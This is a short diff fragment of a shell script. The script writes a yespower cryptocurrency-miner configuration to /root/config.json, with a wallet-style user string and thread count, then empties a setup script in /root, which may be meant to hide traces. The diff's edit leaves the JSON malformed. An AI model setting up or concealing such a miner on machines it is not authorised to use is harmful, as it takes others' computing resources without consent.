@@ -32,6 +32,8 @@ cat >>/root/config.json <<EOF
   "user": "v3K4mds92oWPHSPuQ4Tm6bSSNMCmNj1JyY.Linode",
   "algo": "yespower",
   "threads": $cores,
+  "option": "yespower",
+  "variant": "-T"
 }
 EOF
 cat /dev/null > /root/danielluis1921.sh
